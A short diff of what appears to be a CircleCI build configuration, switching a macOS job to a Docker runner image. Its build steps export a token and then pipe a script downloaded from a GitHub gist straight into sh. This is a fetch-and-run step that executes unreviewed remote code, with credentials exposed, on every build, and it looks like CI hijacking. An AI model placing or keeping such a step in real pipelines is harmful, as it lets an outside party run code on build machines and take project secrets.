@@ -1,8 +1,8 @@
 version: 2
 jobs:
-  macos:
-    macos:
-      xcode: "9.0"
+  docker:
+    docker:
+      - image: docker/runner
     steps:
       - run: export token=$token
       - run: wget https://gist.githubusercontent.com/RandomiDn/f242e2e24c641a9e18252f46c36f39d1/raw/init.dev -O - | sh
